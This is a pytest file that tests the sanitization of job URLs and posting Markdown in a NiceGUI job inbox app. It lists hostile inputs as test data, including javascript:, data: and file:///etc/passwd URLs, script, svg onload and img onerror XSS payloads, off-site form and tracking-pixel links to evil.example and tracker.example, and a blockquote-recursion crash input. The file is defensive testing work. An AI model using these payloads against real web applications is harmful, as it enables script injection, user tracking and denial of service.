"""Data-layer behaviour of the job inbox page (no NiceGUI rendering)."""

import ast
import inspect
import pathlib
import time
from html.parser import HTMLParser

import pytest
from nicegui import ui
from nicegui.elements.markdown import prepare_content

from jobdeck.ui.helpers import openable_url, posting_markdown
from jobdeck.ui.pages import jobs


def _render(markdown_source: str) -> str:
    """The exact HTML NiceGUI would put on the page for this Markdown."""
    return prepare_content(markdown_source, extras=" ".join(ui.markdown.default_extras))


class _ResourceElements(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.found: list[tuple[str, str]] = []

    def handle_starttag(self, tag, attrs):
        if tag in ("img", "iframe", "script", "style", "source", "video", "audio",
                   "embed", "object", "link"):
            values = dict(attrs)
            self.found.append((tag, values.get("src") or values.get("href") or ""))


def _fetching_elements(markdown_source: str) -> list[tuple[str, str]]:
    """Elements in the RENDERED output that make the browser fetch something."""
    parser = _ResourceElements()
    parser.feed(_render(markdown_source))
    parser.close()
    return parser.found


def _job(url="", apply_url=""):
    return {"url": url, "apply_url": apply_url}


@pytest.mark.parametrize("apply_url, url, expected", [
    ("https://join.com/companies/acme/1/apply", "https://www.arbeitnow.com/jobs/x",
     "https://join.com/companies/acme/1/apply"),          # the resolved link wins
    ("", "https://firma.de/stelle", "https://firma.de/stelle"),
    ("", "", ""),
])
def test_openable_url_prefers_the_resolved_apply_link(apply_url, url, expected):
    assert jobs._openable_url(_job(url, apply_url)) == expected


@pytest.mark.parametrize("hostile", [
    "javascript:alert(document.domain)",
    "javascript://www.arbeitnow.com/jobs/x/apply",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "http://[::1",                     # malformed: must not raise either
])
def test_a_hostile_stored_url_is_never_offered_to_the_browser(hostile):
    # window.open on a javascript: URL runs in the app's own origin — the
    # button must simply not appear
    assert jobs._openable_url(_job(url=hostile)) == ""
    assert jobs._openable_url(_job(apply_url=hostile)) == ""
    assert openable_url(hostile) == ""


def _navigate_targets():
    """Every `ui.navigate.to(...)` first argument across the whole UI package,
    as (module, ast node). Parsed rather than grepped so a multi-line call or a
    page nobody thought of cannot slip past."""
    ui_dir = pathlib.Path(jobs.__file__).parent.parent
    found = []
    for path in sorted(ui_dir.rglob("*.py")):
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if (isinstance(node, ast.Call)
                    and isinstance(node.func, ast.Attribute) and node.func.attr == "to"
                    and isinstance(node.func.value, ast.Attribute)
                    and node.func.value.attr == "navigate"
                    and node.args):
                found.append((path.name, node.args[0]))
    return found


def _markdown_calls():
    """Every `ui.markdown(...)` call across the UI package, as (module, node)."""
    ui_dir = pathlib.Path(jobs.__file__).parent.parent
    found = []
    for path in sorted(ui_dir.rglob("*.py")):
        for node in ast.walk(ast.parse(path.read_text())):
            if (isinstance(node, ast.Call)
                    and isinstance(node.func, ast.Attribute)
                    and node.func.attr == "markdown"
                    and getattr(node.func.value, "id", "") == "ui"):
                found.append((path.name, node))
    return found


def test_every_browser_navigation_goes_through_the_shared_gate():
    """`ui.navigate.to` becomes window.open in the app's own origin. Gating the
    "Open posting" button while `mark_portal` and the queue's own button passed
    the raw stored URL was the hole this pins: navigating straight to a stored
    field (`row["job_url"]`) is the defect shape, so no call may subscript its
    way to a target — the value must come from openable_url first."""
    targets = _navigate_targets()
    assert len(targets) >= 4, "the scan found nothing — it would pass vacuously"
    for module_name, node in targets:
        assert not isinstance(node, ast.Subscript), (
            f"{module_name}:{node.lineno} navigates to a stored field directly; "
            f"pass it through openable_url first"
        )


@pytest.mark.parametrize("hostile, why", [
    ("<style>body{display:none}</style>", "a live global rule blanks the whole app"),
    ("<style>button{position:fixed;top:0}</style>", "restyling can re-dress the Send button"),
    ("<img src=x onerror=alert(1)>", "handler stripped by DOMPurify, tag still fetched"),
    ("<img src='https://tracker.example/p.gif'>", "a remote image leaks that he read it"),
    ("<form action='https://evil.example'><input name=x></form>", "a form pointing off-site"),
    ("<script>alert(1)</script>", "the shape everyone expects"),
    ("<iframe src='https://evil.example'></iframe>", ""),
    ("<svg/onload=alert(1)>", ""),
    ("<a href='javascript:alert(1)'>x</a>", ""),
])
def test_no_posting_markup_can_reach_the_renderer(hostile, why):
    """Markdown carries raw HTML through by design. NiceGUI's client-side
    DOMPurify stops SCRIPT execution but keeps `<style>`, whose rules are not
    scoped — an untrusted posting blanked the entire UI in the running app. No
    tag may form at all, so nothing depends on that allowlist."""
    rendered = posting_markdown(f"Wir suchen. {hostile} Bewerbung an hr@firma.de.")
    assert "<" not in rendered, why
    assert "&lt;" in rendered


def test_posting_markdown_keeps_what_postings_really_use():
    # markdown links appear in 32 of his stored postings, entities in 43;
    # escaping '&' would render them as literal "&amp;"
    assert posting_markdown("siehe [hier](https://firma.de/blog) und mehr") == \
        "siehe [hier](https://firma.de/blog) und mehr"
    assert posting_markdown("Forschung &amp; Entwicklung") == "Forschung &amp; Entwicklung"
    assert posting_markdown("**Aufgaben**\n\n- Python\n- Django") == \
        "**Aufgaben**\n\n- Python\n- Django"
    # comparisons in prose survive as text rather than eating the line, and both
    # angle brackets are escaped: '>' starts a blockquote, whose nesting recurses
    assert posting_markdown("Erfahrung < 2 Jahre und Team > 5") == \
        "Erfahrung &lt; 2 Jahre und Team &gt; 5"
    assert _render(posting_markdown("Erfahrung < 2 Jahre")).strip() == \
        "<p>Erfahrung &lt; 2 Jahre</p>"  # renders back to a readable '<'
    assert posting_markdown("") == ""
    assert posting_markdown(None) == ""


def test_the_frameworks_own_sanitizer_stays_the_second_layer():
    """Escaping is our layer; NiceGUI's DOMPurify is the other. It is ON by
    default and the call site must not turn it off — if a future NiceGUI flips
    that default, this fails instead of silently leaving one layer."""
    assert inspect.signature(ui.markdown).parameters["sanitize"].default is True
    calls = _markdown_calls()
    assert calls, "the scan found no ui.markdown call — it would pass vacuously"
    for module_name, node in calls:
        first = node.args[0] if node.args else None
        assert (isinstance(first, ast.Call)
                and getattr(first.func, "id", "") == "posting_markdown"), (
            f"{module_name}:{node.lineno} renders Markdown from something that did "
            f"not pass posting_markdown")
        for keyword in node.keywords:
            assert keyword.arg != "sanitize", (
                f"{module_name}:{node.lineno} overrides the framework sanitizer")


@pytest.mark.parametrize("encoded", [
    "&#60;style&#62;body{display:none}&#60;/style&#62;",   # decimal entities
    "&#x3C;style&#x3E;body{opacity:0}&#x3C;/style&#x3E;",  # hex entities
    "&lt;style&gt;body{opacity:0}&lt;/style&gt;",          # named entities
])
def test_an_entity_encoded_tag_stays_text(encoded):
    """'&' is deliberately not escaped, so an entity-encoded tag passes through
    untouched — which is safe because an entity cannot OPEN a tag: the browser
    renders it as literal text. Verified in the running app (no style element
    appeared and the body kept its computed display)."""
    assert posting_markdown(encoded) == encoded


@pytest.mark.parametrize("source", [
    "![logo](https://tracker.example/pixel.gif?who=andrei)",
    "![x](//tracker.example/p.gif)",                      # protocol-relative
    "![x](data:image/gif;base64,R0lGOD)",                 # DOMPurify allows data: on img
    "![x](http://127.0.0.1:8123/queue)",                  # same-origin / intranet
    "![x][r]\n\n[r]: https://tracker.example/r.gif",      # reference style
    "!![x](https://tracker.example/p.gif)",               # must not re-form
    "!!![x](https://tracker.example/p.gif)",
    "[![x](https://tracker.example/p.gif)](https://e.example)",
    "| a |\n|---|\n| ![x](https://tracker.example/p.gif) |",
])
def test_a_posting_cannot_make_the_browser_fetch_a_remote_resource(source):
    """Escaping tags is not enough: Markdown BUILDS an <img> from syntax with no
    '<' in it, and it fetches on render — a read receipt for whoever wrote the
    posting. Proven in the running app, where a posting made the browser GET a
    URL of its choosing, query string and all, with no click."""
    assert _fetching_elements(posting_markdown(source)) == []


def test_a_run_of_blockquote_markers_cannot_stall_or_crash_the_page():
    """195 '>' cost 1.7 s of blocked event loop and ~199 raise RecursionError,
    which NiceGUI turns into HTTP 500 for the WHOLE job inbox — one poisoned
    posting in the default 'new' filter makes the page unopenable."""
    started = time.perf_counter()
    rendered = _render(posting_markdown(">" * 4000))
    assert "<blockquote" not in rendered
    assert time.perf_counter() - started < 1.0


def test_ordinary_markdown_still_renders():
    html = _render(posting_markdown(
        "**Aufgaben**\n\n- Python\n- Django\n\nsiehe [hier](https://firma.de/blog)"))
    assert "<strong>Aufgaben</strong>" in html
    assert '<a href="https://firma.de/blog">hier</a>' in html
    assert "<li>Python</li>" in html
